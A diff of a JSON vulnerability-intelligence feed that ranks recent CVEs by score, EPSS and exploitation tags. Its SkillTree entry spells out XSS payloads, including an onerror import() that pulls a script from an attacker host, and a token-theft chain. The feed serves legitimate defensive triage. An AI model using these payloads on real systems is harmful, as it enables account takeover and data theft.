@@ -153,6 +153,35 @@
     ]
   },
   {
+    "cve_id": "CVE-2026-87491",
+    "published": "2026-09-09T01:17:05.887",
+    "last_modified": "2026-09-10T12:49:02.630",
+    "cvss_v3": 8.8,
+    "severity": "HIGH",
+    "affected": [],
+    "summary": "Out of bounds write in V8 in Google Chrome prior to 153.0.8010.36 allowed a remote attacker to execute arbitrary code inside the sandbox via a crafted HTML page. (Chromium security severity: Medium)",
+    "references": [
+      "https://chromereleases.googleblog.com/2026/09/stable-channel-update-for-desktop_0808145027.html",
+      "https://issues.chromium.org/issues/543557673",
+      "https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2026-87491"
+    ],
+    "source": "NVD",
+    "cisa_kev": true,
+    "epss": 0.9,
+    "epss_percentile": 56.4,
+    "tags": [
+      "cisa_kev",
+      "in_the_wild",
+      "rce"
+    ],
+    "intel_score": 124.0,
+    "reasons": [
+      "recently modified (last 48h)",
+      "rce+30",
+      "CISA KEV active exploitation (+40)"
+    ]
+  },
+  {
     "cve_id": "CVE-2026-27606",
     "published": "2026-02-25T03:16:04.603",
     "last_modified": "2026-09-10T13:18:01.097",
@@ -278,66 +307,6 @@
     ]
   },
   {
-    "cve_id": "CVE-2026-73670",
-    "published": "2026-08-13T16:19:07.400",
-    "last_modified": "2026-09-09T20:35:08.537",
-    "cvss_v3": 7.2,
-    "severity": "HIGH",
-    "affected": [],
-    "summary": "A CMS contains a SQL injection vulnerability in admin/db_data.php at line 509 that allows authenticated administrators to inject arbitrary SQL into a SHOW COLUMNS FROM statement by supplying unsanitized input through the table_name GET or POST parameter. Attackers can perform table traversal, time-based blind, boolean-based blind, and error-based injection techniques to enumerate full database schema, access system tables such as information_schema, and chain the disclosure with secondary injection points to extract credential data.",
-    "references": [
-      "https://github.com/DevVaibhav07/VULN-POC/blob/main/Saurus.md",
-      "https://github.com/sauruscms/Saurus-CMS-Community-Edition",
-      "https://www.vulncheck.com/advisories/cms-admin-sql-injection-via-db-data-php-table-name-parameter",
-      "https://www.vulncheck.com/blog/filerun-thumbnail-command-injection-rce"
-    ],
-    "source": "NVD",
-    "cisa_kev": false,
-    "epss": 0.4,
-    "epss_percentile": 33.4,
-    "tags": [
-      "poc",
-      "rce",
-      "sqli"
-    ],
-    "intel_score": 114.0,
-    "reasons": [
-      "recently modified (last 48h)",
-      "rce+30",
-      "sqli+18",
-      "poc+20"
-    ]
-  },
-  {
-    "cve_id": "CVE-2026-68771",
-    "published": "2026-07-31T22:17:03.630",
-    "last_modified": "2026-09-09T20:35:08.537",
-    "cvss_v3": 9.8,
-    "severity": "CRITICAL",
-    "affected": [],
-    "summary": "ComfyUI v0.23.0 contains an unsafe deserialization vulnerability in the LoadTrainingDataset node that allows unauthenticated remote attackers to execute arbitrary Python code by uploading a crafted pickle file and triggering its deserialization. Attackers can upload a malicious shard_*.pkl file via the unauthenticated POST /upload/image endpoint and then queue a workflow graph via POST /prompt referencing the uploaded file, causing torch.load to deserialize the attacker-controlled pickle payload using __reduce__ and execute arbitrary commands as the ComfyUI process user.",
-    "references": [
-      "https://github.com/Comfy-Org/ComfyUI",
-      "https://github.com/Comfy-Org/ComfyUI/commit/94ee49b1612824366a8631ea069b2a1fa5c73720",
-      "https://github.com/Comfy-Org/ComfyUI/pull/14543",
-      "https://www.vulncheck.com/advisories/comfyui-unauthenticated-rce-via-loadtrainingdataset-pickle-deserialization"
-    ],
-    "source": "NVD",
-    "cisa_kev": false,
-    "epss": 0.8,
-    "epss_percentile": 53.9,
-    "tags": [
-      "deserialization",
-      "rce"
-    ],
-    "intel_score": 109.0,
-    "reasons": [
-      "recently modified (last 48h)",
-      "rce+30",
-      "deserialization+20"
-    ]
-  },
-  {
     "cve_id": "CVE-2026-80428",
     "published": "2026-08-26T16:16:45.100",
     "last_modified": "2026-09-10T20:48:45.067",
@@ -366,37 +335,6 @@
       "recently modified (last 48h)",
       "rce+30",
       "deserialization+20"
-    ]
-  },
-  {
-    "cve_id": "CVE-2026-63376",
-    "published": "2026-09-03T21:17:21.513",
-    "last_modified": "2026-09-09T21:09:13.080",
-    "cvss_v3": 8.2,
-    "severity": "HIGH",
-    "affected": [],
-    "summary": "toml-node is a TOML parser for Node.js and the browser. Prior to 4.1.2, toml.parse() in lib/compiler.js can be tricked by a table path such as a.b.y.__proto__.__proto__, allowing traversal from a scalar value into Number.prototype and Object.prototype. The currentPath tracking value uses both arrays and strings, so valueAssignments records a comma-joined path such as a,b.y while deepRef checks the dot-joined path a.b.y, allowing the duplicate-key guard to miss and attacker-controlled keys to be written to Object.prototype. A table-array prefix-clearing path in addTableArray can also erase guard state before the same __proto__ traversal. Injected properties become visible throughout the Node.js process and can cause denial of service, logic or authorization bypass, or code execution when an application contains a suitable gadget. This issue is fixed in version 4.1.2.",
-    "references": [
-      "https://github.com/BinaryMuse/toml-node/commit/def6ab5ea99038c0dd482cd6af1745a6af8b4c44",
-      "https://github.com/BinaryMuse/toml-node/commit/dfaff662276adc38a2e03df3139f7119b0185463",
-      "https://github.com/BinaryMuse/toml-node/security/advisories/GHSA-v5mp-jgw5-2x6j",
-      "https://github.com/BinaryMuse/toml-node/security/advisories/GHSA-v5mp-jgw5-2x6j"
-    ],
-    "source": "NVD",
-    "cisa_kev": false,
-    "epss": 0.4,
-    "epss_percentile": 31.8,
-    "tags": [
-      "auth_bypass",
-      "dos",
-      "rce"
-    ],
-    "intel_score": 109.0,
-    "reasons": [
-      "recently modified (last 48h)",
-      "rce+30",
-      "auth_bypass+25",
-      "dos+3"
     ]
   },
   {
@@ -452,31 +390,29 @@
     ]
   },
   {
-    "cve_id": "CVE-2026-61515",
-    "published": "2026-08-04T15:16:36.967",
-    "last_modified": "2026-09-09T20:35:08.537",
-    "cvss_v3": 9.8,
+    "cve_id": "CVE-2026-67401",
+    "published": "2026-09-09T16:17:03.883",
+    "last_modified": "2026-09-10T04:18:04.630",
+    "cvss_v3": 9.9,
     "severity": "CRITICAL",
     "affected": [],
-    "summary": "Puwell IP Camera firmware versions 2.x through 4.x contains an unauthenticated command injection vulnerability that allows remote attackers to execute arbitrary operating system commands by sending a crafted JSON payload to the DebugShell interface exposed on TCP port 34567. Attackers can exploit the lack of authentication and input sanitization in the binary protocol service to pass arbitrary commands directly to the underlying operating system, achieving root-level code execution and complete device compromise.",
+    "summary": "A vulnerability in cPanel allows a mail-enabled account to achieve remote code execution as root through SQLi in EmailTrack component",
     "references": [
-      "https://damiri.fr/fr/cve/CVE-2026-61515",
-      "https://www.puwell.com/Index/catalog",
-      "https://www.vulncheck.com/advisories/puwell-ip-camera-2-x-4-x-unauthenticated-command-injection-via-debugshell"
+      "https://support.cpanel.net/hc/en-us/articles/43187903921559-Security-CVE-2026-67401-SQL-Injection-Vulnerability-in-cPanel-s-EmailTrack-Functionality-September-8-2026"
     ],
     "source": "NVD",
     "cisa_kev": false,
-    "epss": 1.6,
-    "epss_percentile": 74.7,
+    "epss": 1.0,
+    "epss_percentile": 59.5,
     "tags": [
-      "command_injection",
-      "rce"
+      "rce",
+      "sqli"
     ],
-    "intel_score": 107.0,
+    "intel_score": 107.5,
     "reasons": [
       "recently modified (last 48h)",
       "rce+30",
-      "command_injection+18"
+      "sqli+18"
     ]
   },
   {
@@ -532,58 +468,29 @@
     ]
   },
   {
-    "cve_id": "CVE-2026-72841",
-    "published": "2026-08-13T22:17:23.813",
-    "last_modified": "2026-09-09T20:35:08.537",
-    "cvss_v3": 9.9,
+    "cve_id": "CVE-2026-81048",
+    "published": "2026-09-10T16:17:57.543",
+    "last_modified": "2026-09-11T04:17:57.060",
+    "cvss_v3": 9.6,
     "severity": "CRITICAL",
     "affected": [],
-    "summary": "luci-app-openvpn fails to properly validate the instance_name2 parameter during file upload, allowing authenticated users to perform path traversal and write arbitrary files outside the intended directory. Attackers can upload malicious payloads to gain persistent root code execution by placing SSH keys in system directories accessible on reboot.",
+    "summary": "Dell ThinOS 10, versions prior to 2605_10.2616, contain an Improper Neutralization of Special Elements used in a Command ('Command Injection') vulnerability. An unauthenticated attacker with adjacent network access could potentially exploit this vulnerability, leading to Remote Code execution",
     "references": [
-      "https://github.com/openwrt/luci/security/advisories/GHSA-jjcx-c284-2qv8",
-      "https://www.vulncheck.com/advisories/luci-app-openvpn-path-traversal-rce-via-instance-name2",
-      "https://github.com/openwrt/luci/security/advisories/GHSA-jjcx-c284-2qv8"
+      "https://www.dell.com/support/kbdoc/en-us/000502746/dsa-2026-389-security-update-for-dell-thinos-10-for-multiple-vulnerabilities"
     ],
     "source": "NVD",
     "cisa_kev": false,
-    "epss": 0.5,
-    "epss_percentile": 43.5,
+    "epss": 1.3,
+    "epss_percentile": 68.6,
     "tags": [
-      "path_traversal",
+      "command_injection",
       "rce"
     ],
-    "intel_score": 104.5,
+    "intel_score": 106.0,
     "reasons": [
       "recently modified (last 48h)",
       "rce+30",
-      "path_traversal+15"
-    ]
-  },
-  {
-    "cve_id": "CVE-2026-72842",
-    "published": "2026-08-13T22:17:23.977",
-    "last_modified": "2026-09-09T20:35:08.537",
-    "cvss_v3": 9.9,
-    "severity": "CRITICAL",
-    "affected": [],
-    "summary": "luci-app-lxc contains an ACL inconsistency vulnerability that allows low-privileged authenticated LuCI users to access backend container management routes without proper authorization checks. Attackers can exploit path traversal via `/.%2E` in the `lxc_name` parameter to escape container directories and control host-side scripts executed through `lxc.hook.start-host`, achieving root code execution on the OpenWrt host.",
-    "references": [
-      "https://github.com/openwrt/luci/security/advisories/GHSA-jf59-v86x-fwf2",
-      "https://www.vulncheck.com/advisories/openwrt-luci-app-lxc-acl-inconsistency-authentication-bypass"
-    ],
-    "source": "NVD",
-    "cisa_kev": false,
-    "epss": 0.4,
-    "epss_percentile": 35.7,
-    "tags": [
-      "path_traversal",
-      "rce"
-    ],
-    "intel_score": 104.5,
-    "reasons": [
-      "recently modified (last 48h)",
-      "rce+30",
-      "path_traversal+15"
+      "command_injection+18"
     ]
   },
   {
@@ -670,32 +577,60 @@
     ]
   },
   {
-    "cve_id": "CVE-2026-58400",
-    "published": "2026-09-03T18:17:22.827",
-    "last_modified": "2026-09-09T21:09:13.080",
-    "cvss_v3": 9.1,
+    "cve_id": "CVE-2026-18351",
+    "published": "2026-09-10T02:16:34.180",
+    "last_modified": "2026-09-10T14:39:13.757",
+    "cvss_v3": 9.8,
     "severity": "CRITICAL",
     "affected": [],
-    "summary": "GeoNetwork is a catalog application to manage spatially referenced resources. Prior to versions 4.4.12 and 4.2.17, the Saxon XSLT processor used to render formatters is configured without secure processing (`FEATURE_SECURE_PROCESSING`) and without disabling Java extension functions (`ALLOW_EXTERNAL_FUNCTIONS`). Any stylesheet loaded by GeoNetwork can therefore invoke\n`java.lang.Runtime.exec()` or `java.lang.ProcessBuilder` directly, achieving arbitrary command execution as the GeoNetwork process user. A user with sufficient privileges to upload a formatter can deliver a `.xsl` file containing Java extension call that execute arbitrary OS commands with the privileges of the GeoNetwork process. The issue is patched in GeoNetwork versions 4.4.12 and 4.2.17.",
+    "summary": "The Drag and Drop File Upload for Elementor Forms plugin for WordPress is vulnerable to Arbitrary File Upload in all versions up to, and including, 1.6.0 via the elementor_file_upload function. This is due to insufficient file type validation in the is_file_type_valid() function, which uses the attacker-controlled 'type' parameter as regex keys in the MIME allowlist, allowing blacklist bypass via a crafted extension that sanitize_file_name() later normalizes to a PHP extension. This makes it possible for unauthenticated attackers to upload files that may be executable, which makes remote code execution possible.",
     "references": [
-      "https://docs.geonetwork-opensource.org/4.2/overview/change-log/version-4.2.17",
-      "https://docs.geonetwork-opensource.org/4.4/overview/change-log/version-4.4.12",
-      "https://github.com/geonetwork/core-geonetwork/security/advisories/GHSA-x898-729x-cc3r",
-      "https://thehackernews.com/2026/09/geonetwork-fixes-unauthenticated-rce.html"
+      "https://plugins.svn.wordpress.org/drag-and-drop-file-upload-for-elementor-forms/tags/1.6.0/drag-and-drop-file-upload-for-elementor-forms.php",
+      "https://plugins.svn.wordpress.org/drag-and-drop-file-upload-for-elementor-forms/tags/1.6.0/fields/file_upload.php",
+      "https://plugins.trac.wordpress.org/browser/drag-and-drop-file-upload-for-elementor-forms/tags/1.6.0/fields/file_upload.php#L833",
+      "https://plugins.trac.wordpress.org/changeset/3628051/drag-and-drop-file-upload-for-elementor-forms",
+      "https://www.wordfence.com/threat-intel/vulnerabilities/id/03e853be-510f-4957-a227-17ca9f825b12?source=cve"
     ],
     "source": "NVD",
     "cisa_kev": false,
-    "epss": 1.2,
-    "epss_percentile": 66.1,
+    "epss": 0.8,
+    "epss_percentile": 53.5,
     "tags": [
-      "command_injection",
+      "file_write",
       "rce"
     ],
-    "intel_score": 103.5,
+    "intel_score": 104.0,
     "reasons": [
       "recently modified (last 48h)",
       "rce+30",
-      "command_injection+18"
+      "file_write+15"
+    ]
+  },
+  {
+    "cve_id": "CVE-2026-63427",
+    "published": "2026-09-10T21:17:28.347",
+    "last_modified": "2026-09-11T15:17:02.600",
+    "cvss_v3": 7.8,
+    "severity": "HIGH",
+    "affected": [],
+    "summary": "An authentication bypass vulnerability was discovered in Lenovo Software Fix that could allow a local authenticated user to perform arbitrary code execution with elevated privileges.",
+    "references": [
+      "https://support.lenovo.com/us/en/downloads/ds101291-rescue-and-smart-assistant-lmsa",
+      "https://support.lenovo.com/us/en/product_security/LEN-217409"
+    ],
+    "source": "NVD",
+    "cisa_kev": false,
+    "epss": 0.1,
+    "epss_percentile": 3.4,
+    "tags": [
+      "auth_bypass",
+      "rce"
+    ],
+    "intel_score": 104.0,
+    "reasons": [
+      "recently modified (last 48h)",
+      "rce+30",
+      "auth_bypass+25"
     ]
   },
   {
@@ -728,21 +663,126 @@
     ]
   },
   {
-    "cve_id": "CVE-2026-67195",
-    "published": "2026-08-04T15:16:40.130",
-    "last_modified": "2026-09-09T20:35:08.537",
+    "cve_id": "CVE-2026-73693",
+    "published": "2026-09-10T17:17:05.667",
+    "last_modified": "2026-09-10T19:58:20.507",
     "cvss_v3": 8.8,
     "severity": "HIGH",
     "affected": [],
-    "summary": "Perspective 5.0.0 contains a remote code execution vulnerability that allows unauthenticated attackers to execute arbitrary operating system commands by submitting crafted expression strings to the PolarsVirtualServer backend, which passes client-supplied input directly to Python's eval() with only __builtins__={} cleared. Attackers can exploit Python object attribute traversal through the interpreter's loaded class list to reach subprocess.Popen via a TableValidateExprReq or TableMakeViewReq protobuf message, achieving arbitrary command execution in the Perspective host process.",
+    "summary": "FileRun before 2026.3.0 contains an OS command injection vulnerability in the PhotoProofSheet handler that allows authenticated users with upload permission to execute arbitrary commands by uploading files with shell metacharacters in their names. Attackers can upload a file containing command substitution syntax such as backticks, semicolons, or $() sequences in the filename, then trigger the PhotoProofSheet endpoint to execute arbitrary commands as the web-server user due to missing escapeshellarg() sanitization in the ImageMagick montage command construction.",
     "references": [
-      "https://christbowel.com/blog/perspective-5-0-0-five-cves/",
-      "https://www.vulncheck.com/advisories/perspective-rce-via-eval-expression-injection"
+      "https://filerun.com/index.php/changelog?v=2026.3.0",
+      "https://vulncheck.com/blog/filerun-delegated-admin-sql-to-object-injection-rce",
+      "https://www.vulncheck.com/advisories/filerun-os-command-injection-via-photoproofsheet-handler"
     ],
     "source": "NVD",
     "cisa_kev": false,
-    "epss": 1.2,
-    "epss_percentile": 65.2,
+    "epss": 1.8,
+    "epss_percentile": 77.2,
+    "tags": [
+      "command_injection",
+      "rce"
+    ],
+    "intel_score": 102.0,
+    "reasons": [
+      "recently modified (last 48h)",
+      "rce+30",
+      "command_injection+18"
+    ]
+  },
+  {
+    "cve_id": "CVE-2026-81550",
+    "published": "2026-09-10T22:17:02.653",
+    "last_modified": "2026-09-11T14:56:50.613",
+    "cvss_v3": 8.8,
+    "severity": "HIGH",
+    "affected": [],
+    "summary": "IBM DataStage on Cloud Pak for Data 5.4.0.0 could allow a remote authenticated attacker to execute arbitrary code due to improper neutralization of special elements used in an OS command.",
+    "references": [
+      "https://www.ibm.com/support/pages/node/7286562"
+    ],
+    "source": "NVD",
+    "cisa_kev": false,
+    "epss": 0.5,
+    "epss_percentile": 43.9,
+    "tags": [
+      "command_injection",
+      "rce"
+    ],
+    "intel_score": 102.0,
+    "reasons": [
+      "recently modified (last 48h)",
+      "rce+30",
+      "command_injection+18"
+    ]
+  },
+  {
+    "cve_id": "CVE-2026-82095",
+    "published": "2026-09-10T22:17:03.513",
+    "last_modified": "2026-09-11T14:56:50.613",
+    "cvss_v3": 8.8,
+    "severity": "HIGH",
+    "affected": [],
+    "summary": "IBM DataStage on Cloud Pak for Data 5.4.0.0 could allow a remote authenticated attacker to execute arbitrary code due to improper neutralization of special elements used in an OS command.",
+    "references": [
+      "https://www.ibm.com/support/pages/node/7286562"
+    ],
+    "source": "NVD",
+    "cisa_kev": false,
+    "epss": 0.5,
+    "epss_percentile": 43.9,
+    "tags": [
+      "command_injection",
+      "rce"
+    ],
+    "intel_score": 102.0,
+    "reasons": [
+      "recently modified (last 48h)",
+      "rce+30",
+      "command_injection+18"
+    ]
+  },
+  {
+    "cve_id": "CVE-2026-82097",
+    "published": "2026-09-10T22:17:03.650",
+    "last_modified": "2026-09-11T14:56:50.613",
+    "cvss_v3": 8.8,
+    "severity": "HIGH",
+    "affected": [],
+    "summary": "IBM DataStage on Cloud Pak for Data 5.4.0.0 could allow a remote authenticated attacker to execute arbitrary code due to a Server-Side Request Forgery (SSRF) vulnerability.",
+    "references": [
+      "https://www.ibm.com/support/pages/node/7286562"
+    ],
+    "source": "NVD",
+    "cisa_kev": false,
+    "epss": 0.4,
+    "epss_percentile": 28.7,
+    "tags": [
+      "rce",
+      "ssrf"
+    ],
+    "intel_score": 102.0,
+    "reasons": [
+      "recently modified (last 48h)",
+      "rce+30",
+      "ssrf+18"
+    ]
+  },
+  {
+    "cve_id": "CVE-2026-82099",
+    "published": "2026-09-10T22:17:03.957",
+    "last_modified": "2026-09-11T21:17:24.347",
+    "cvss_v3": 8.8,
+    "severity": "HIGH",
+    "affected": [],
+    "summary": "IBM DataStage on Cloud Pak for Data 5.4.0.0 could allow a remote authenticated attacker to execute arbitrary code due to improper neutralization of special elements used in an OS command.",
+    "references": [
+      "https://www.ibm.com/support/pages/node/7286562"
+    ],
+    "source": "NVD",
+    "cisa_kev": false,
+    "epss": 0.4,
+    "epss_percentile": 37.1,
     "tags": [
       "command_injection",
       "rce"
@@ -889,6 +929,89 @@
     ]
   },
   {
+    "cve_id": "CVE-2026-81192",
+    "published": "2026-09-08T21:18:43.447",
+    "last_modified": "2026-09-10T19:58:20.507",
+    "cvss_v3": 7.0,
+    "severity": "HIGH",
+    "affected": [],
+    "summary": "`OpenTelemetry.Resources.Host` NuGet package, which provides OpenTelemetry resource detectors for host, is affected by an untrusted search path vulnerability on macOS. Prior to version 1.16.0-beta.2, the `host.id` resource attribute detector launches the `sh` and `ioreg` executables by bare name rather than by absolute path, so both are resolved through the `PATH` environment variable. A local attacker who is less privileged than the host application, and who can influence `PATH` or write to a directory that appears in `PATH` ahead of the system directories, can have an arbitrary binary executed in the application's security context, resulting in local code execution/privilege escalation. This vulnerability only affect macOS hosts - Linux and Windows hosts are unaffected. Version 1.16.0-beta.2 contains a patch. No known workarounds are available.",
+    "references": [
+      "https://github.com/open-telemetry/opentelemetry-dotnet-contrib/pull/1631",
+      "https://github.com/open-telemetry/opentelemetry-dotnet-contrib/pull/4760",
+      "https://github.com/open-telemetry/opentelemetry-dotnet-contrib/security/advisories/GHSA-v8pv-4842-x354"
+    ],
+    "source": "NVD",
+    "cisa_kev": false,
+    "epss": 0.1,
+    "epss_percentile": 3.5,
+    "tags": [
+      "priv_esc",
+      "rce"
+    ],
+    "intel_score": 100.0,
+    "reasons": [
+      "recently modified (last 48h)",
+      "rce+30",
+      "priv_esc+25"
+    ]
+  },
+  {
+    "cve_id": "CVE-2026-84869",
+    "published": "2026-09-08T20:18:51.147",
+    "last_modified": "2026-09-12T04:16:42.757",
+    "cvss_v3": 9.9,
+    "severity": "CRITICAL",
+    "affected": [],
+    "summary": "A condition in the ScreenConnect client may allow files to be transferred and executed through an active remote session without authorization or Host confirmation in certain circumstances. ScreenConnect servers are not impacted.",
+    "references": [
+      "https://github.com/ConnectWise-Advisories/Disclosures/tree/main/CVE-2026-84869",
+      "https://www.connectwise.com/company/trust/advisories",
+      "https://www.connectwise.com/company/trust/security-bulletins/2026-09-08-screenconnect-bulletin",
+      "https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2026-84869",
+      "https://www.huntress.com/blog/rogue-screenconnect-installations"
+    ],
+    "source": "NVD",
+    "cisa_kev": true,
+    "epss": 0.7,
+    "epss_percentile": 50.8,
+    "tags": [
+      "cisa_kev",
+      "in_the_wild"
+    ],
+    "intel_score": 99.5,
+    "reasons": [
+      "recently modified (last 48h)",
+      "CISA KEV active exploitation (+40)"
+    ]
+  },
+  {
+    "cve_id": "CVE-2026-68488",
+    "published": "2026-09-10T17:17:05.437",
+    "last_modified": "2026-09-10T19:54:25.810",
+    "cvss_v3": 9.9,
+    "severity": "CRITICAL",
+    "affected": [],
+    "summary": "A Time-of-check Time-of-use (TOCTOU) race condition leading to insecure symlink following in Plesk causes local privilege escalation to root via arbitrary file/directory ownership takeover.",
+    "references": [
+      "https://support.plesk.com/hc/en-us/articles/43248932867351-Vulnerability-in-Plesk-s-Backup-Manager-symlink-race-during-restore-allows-root-privilege-escalation"
+    ],
+    "source": "NVD",
+    "cisa_kev": false,
+    "epss": 0.2,
+    "epss_percentile": 10.4,
+    "tags": [
+      "file_write",
+      "priv_esc"
+    ],
+    "intel_score": 99.5,
+    "reasons": [
+      "recently modified (last 48h)",
+      "priv_esc+25",
+      "file_write+15"
+    ]
+  },
+  {
     "cve_id": "CVE-2022-37969",
     "published": "2022-09-13T19:15:12.323",
     "last_modified": "2026-09-10T04:17:35.097",
@@ -943,31 +1066,30 @@
     ]
   },
   {
-    "cve_id": "CVE-2026-57170",
-    "published": "2026-08-26T05:18:11.763",
-    "last_modified": "2026-09-09T21:09:13.080",
+    "cve_id": "CVE-2026-88889",
+    "published": "2026-09-10T14:17:18.033",
+    "last_modified": "2026-09-10T16:18:11.693",
     "cvss_v3": 7.8,
     "severity": "HIGH",
     "affected": [],
-    "summary": "Compliance-trestle (Trestle) is a Python SDK and command-line tool for managing OSCAL compliance documents. In versions prior to 3.12.4 and 4.0.0 through 4.0.3, the custom Jinja2 include tags mdsection_include and md_clean_include re-parse the content of an included Markdown file as Jinja2 template code in a non-sandboxed environment, allowing server-side template injection that can lead to arbitrary code execution. The MDSectionInclude and MDCleanInclude tags in Trestle/core/jinja/tags.py pass included file content to Parser(self.environment, ...).parse(), splicing it into the host template's compilation, and the environment is a plain jinja2.Environment rather than a SandboxedEnvironment, so any expressions in the file are evaluated with full access to the usual SSTI gadget chain. Because Trestle's Markdown writers emit OSCAL prose and component-description fields verbatim, applying delimiter neutralization only to parameter tables, attacker-controlled OSCAL data such as a control statement, part prose, or component description containing Jinja2 syntax flows into an included Markdown file and is executed when the include tag re-parses it. This issue is fixed in version 4.1.0.",
+    "summary": "Renovate before 44.14.7 contains a command injection vulnerability in the Maven Wrapper manager that allows attackers to execute arbitrary commands by specifying a malicious distributionType parameter in maven-wrapper.properties. Attackers can inject shell commands through unescaped distributionType values to achieve remote code execution when Renovate processes Maven Wrapper updates in binarySource=docker mode.",
     "references": [
-      "https://github.com/oscal-compass/compliance-trestle/commit/0f82d19bd42f9cc0f1b3acd7fc3f6dafe3b6ae10",
-      "https://github.com/oscal-compass/compliance-trestle/commit/5335ff873a2a68eb7de43df029bea09cadff22fd",
-      "https://github.com/oscal-compass/compliance-trestle/security/advisories/GHSA-mr95-65j8-9mxp"
+      "https://github.com/renovatebot/renovate/security/advisories/GHSA-f2v7-35mm-3hx7",
+      "https://www.vulncheck.com/advisories/renovate-before-44.14.7-command-injection-via-distributiontype"
     ],
     "source": "NVD",
     "cisa_kev": false,
-    "epss": 0.2,
-    "epss_percentile": 10.5,
+    "epss": 0.6,
+    "epss_percentile": 48.0,
     "tags": [
-      "deserialization",
+      "command_injection",
       "rce"
     ],
-    "intel_score": 99.0,
+    "intel_score": 97.0,
     "reasons": [
       "recently modified (last 48h)",
       "rce+30",
-      "deserialization+20"
+      "command_injection+18"
     ]
   },
   {
@@ -986,6 +1108,61 @@
     "cisa_kev": false,
     "epss": 0.7,
     "epss_percentile": 51.4,
+    "tags": [
+      "deserialization",
+      "rce"
+    ],
+    "intel_score": 96.0,
+    "reasons": [
+      "recently modified (last 48h)",
+      "rce+30",
+      "deserialization+20"
+    ]
+  },
+  {
+    "cve_id": "CVE-2026-54694",
+    "published": "2026-09-09T19:17:28.400",
+    "last_modified": "2026-09-10T16:17:14.873",
+    "cvss_v3": 9.6,
+    "severity": "CRITICAL",
+    "affected": [],
+    "summary": "SkillTree is a micro-learning gamification platform. Prior to version 4.4.2, two independent code flaws combine into a single exploitable attack chain, with three distinct exploitation paths of escalating impact. `StringHighlighter.js` builds an HTML string by interpolating raw `value` substrings directly into a template literal with no HTML entity encoding. `HighlightedValue.vue` renders that string — and all unfiltered plain values — via Vue's `v-html` directive, which sets `innerHTML`. Separately, the account registration endpoint accepts `firstName`, `lastName`, and `nickname` fields and stores them without any HTML sanitization. An attacker self-registers with `firstName = \"<img src=x onerror=alert(1)>\"` (28 characters — within the 30-character field limit) and visits any quiz. The next time an administrator opens the Quiz Runs page the payload executes in their browser. Three attack paths exist with escalating impact. The first is basic cross-site scripting. Any self-contained payload fitting the 30-character limit (e.g. `<img src=x onerror=alert(1)>`, which is 28 chars) fires automatically when the admin navigates to the runs page through normal use. Arbitrary code execution in the admin's browser is confirmed with zero extra steps. The second is remote script loading via `import()`. Using the split-field technique (`lastName = \"<img src=x\"`, `firstName = \"onerror=import('//nsas.cc/p')>\"`), the attacker loads a full JavaScript file from their server. The file has no size limit and can perform any admin action — delete all projects, create backdoor accounts, dump user data, install a keylogger. No phishing required. The only constraint is that the URL must fit in 11 characters (`//nsas.cc/p`). The third is full cross-site request forgery token theft. Using `eval(name)`, the attacker pre-sets `window.name` to a data-theft payload by sending the admin one redirect link first. The session cookie is `HttpOnly` and cannot be read via `document.cookie`; however, the XSRF token is readable and the attacker leverages same-origin execution to call admin APIs from inside the victim's browser, relaying the responses to an external server. No admin interaction beyond routine use is required. Version 4.4.2 contains a patch.",
+    "references": [
+      "https://github.com/NationalSecurityAgency/skills-service/security/advisories/GHSA-hqfg-c8wf-w2g8",
+      "https://github.com/NationalSecurityAgency/skills-service/security/advisories/GHSA-hqfg-c8wf-w2g8"
+    ],
+    "source": "NVD",
+    "cisa_kev": false,
+    "epss": 0.3,
+    "epss_percentile": 20.7,
+    "tags": [
+      "rce",
+      "xss"
+    ],
+    "intel_score": 96.0,
+    "reasons": [
+      "recently modified (last 48h)",
+      "rce+30",
+      "xss+8"
+    ]
+  },
+  {
+    "cve_id": "CVE-2026-73699",
+    "published": "2026-09-10T17:17:06.083",
+    "last_modified": "2026-09-10T19:58:20.507",
+    "cvss_v3": 7.2,
+    "severity": "HIGH",
+    "affected": [],
+    "summary": "FileRun before 2026.3.0 contains a PHP object injection vulnerability that allows authenticated attackers to execute arbitrary code by exploiting incorrect options passed to unserialize() in the Perms::getPerms() method, where a positional array is used instead of the required named-key array to disable class instantiation. Attackers with database write access can inject a serialized gadget chain into the permissions table columns processed on every authenticated page load to write arbitrary files, such as PHP webshells, to web-accessible paths.",
+    "references": [
+      "https://filerun.com/index.php/changelog?v=2026.3.0",
+      "https://vulncheck.com/blog/filerun-delegated-admin-sql-to-object-injection-rce",
+      "https://www.vulncheck.com/advisories/filerun-php-object-injection-via-perms-getperms"
+    ],
+    "source": "NVD",
+    "cisa_kev": false,
+    "epss": 0.5,
+    "epss_percentile": 43.7,
     "tags": [
       "deserialization",
       "rce"
@@ -1052,92 +1229,59 @@
     ]
   },
   {
-    "cve_id": "CVE-2026-78839",
-    "published": "2026-09-04T19:17:27.703",
-    "last_modified": "2026-09-09T20:20:42.553",
-    "cvss_v3": 8.1,
+    "cve_id": "CVE-2026-73694",
+    "published": "2026-09-10T17:17:05.813",
+    "last_modified": "2026-09-11T19:17:45.790",
+    "cvss_v3": 7.2,
     "severity": "HIGH",
     "affected": [],
-    "summary": "An arbitrary file upload vulnerability in AppNitro MachForm v30 allows attackers to execute arbitrary code via uploading a crafted .phar file.",
+    "summary": "FileRun before 2026.3.0 contains an OS command injection vulnerability caused by a no-op redefinition of escapeshellcmd() in CLI.php that strips shell-metacharacter escaping, allowing attacker-controlled input to reach an exec() sink unsanitized. Attackers can exploit this through an interactive path via image_preview.php with a crafted args parameter requiring superuser authentication, or through a persistent path by storing malicious payloads in thumbnails_ffmpeg_args or thumbnails_ffmpeg_ss that execute when any user triggers video thumbnail generation.",
     "references": [
-      "https://github.com/nabeelmkhan/CVE-2026-78839",
-      "https://packetstormsecurity.com"
+      "https://filerun.com/index.php/changelog?v=2026.3.0",
+      "https://vulncheck.com/blog/filerun-delegated-admin-sql-to-object-injection-rce",
+      "https://www.vulncheck.com/advisories/filerun-os-command-injection-via-escapeshellcmd-no-op-redefinition"
     ],
     "source": "NVD",
     "cisa_kev": false,
-    "epss": 0.5,
-    "epss_percentile": 42.3,
+    "epss": 1.8,
+    "epss_percentile": 77.3,
     "tags": [
-      "file_write",
+      "command_injection",
       "rce"
     ],
-    "intel_score": 95.5,
+    "intel_score": 94.0,
     "reasons": [
       "recently modified (last 48h)",
       "rce+30",
-      "file_write+15"
+      "command_injection+18"
     ]
   },
   {
-    "cve_id": "CVE-2026-57171",
-    "published": "2026-08-26T05:18:11.923",
-    "last_modified": "2026-09-09T21:09:13.080",
-    "cvss_v3": 7.7,
+    "cve_id": "CVE-2026-73698",
